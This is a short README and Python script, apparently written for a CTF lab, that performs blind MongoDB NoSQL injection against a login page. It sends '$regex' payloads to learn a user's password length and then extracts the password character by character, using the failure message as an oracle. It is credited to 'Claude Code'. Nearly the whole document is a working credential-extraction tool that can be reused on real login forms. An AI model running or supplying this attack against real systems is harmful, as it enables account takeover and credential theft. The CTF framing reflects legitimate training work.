## MongoDB Blind NoSQL Injection (Regex-Based Password Extraction)

- NoSQL injection (MongoDB) — exploits $regex query behavior to test password patterns
- Blind extraction attack — reconstructs credentials character-by-character using a response oracle

*A Python script designed for CTF challenges that demonstrates MongoDB NoSQL injection via regex-based blind extraction. It automates password discovery by leveraging application responses as a success/failure oracle, allowing full credential recovery without direct data disclosure.
Built for educational use on intentionally vulnerable systems (e.g., CTFs, labs). Do not use against real targets.*

## Features
*    Automated password length discovery
*    Character by character extraction
*    Response based oracle detection

**Courtesy of Claude Code**
```
import requests
import string
import re
import sys

# ─── CONFIG ───────────────────────────────────────────────────────────────────
TARGET_URL   = "http://10.112.187.95/login.php"
USERNAME     = "pedro"
MAX_LENGTH   = 40
CHARSET      = string.ascii_lowercase + string.ascii_uppercase + string.digits + "!@#$%^&*_-"
FAILURE_TEXT = "Invalid user/password"
# ──────────────────────────────────────────────────────────────────────────────


def make_payload(regex):
    return {"user": USERNAME, "pass[$regex]": regex, "remember": "on"}


def is_match(r):
    return FAILURE_TEXT.lower() not in r.text.lower()


def find_length(session):
    print("[*] Finding password length...")
    for length in range(1, MAX_LENGTH + 1):
        r = session.post(TARGET_URL, data=make_payload(f"^.{{{length}}}$"), allow_redirects=True)
        if is_match(r):
            print(f"[+] Length = {length}\n")
            return length
    print("[-] Could not find length.")
    sys.exit(1)


def find_password(session, length):
    print("[*] Brute-forcing password...")
    password = ""
    for position in range(length):
        for char in CHARSET:
            prefix  = re.escape(password)
            suffix  = "." * (length - position - 1)
            regex   = f"^{prefix}{re.escape(char)}{suffix}$"
            r = session.post(TARGET_URL, data=make_payload(regex), allow_redirects=True)
            if is_match(r):
                password += char
                print(f"  [{position + 1}/{length}] '{char}'  →  {password!r}")
                break
        else:
            print(f"[-] No match at position {position + 1}.")
            break
    return password


session  = requests.Session()
length   = find_length(session)
password = find_password(session, length)
print(f"\n[✓] Password: {password}")i
```
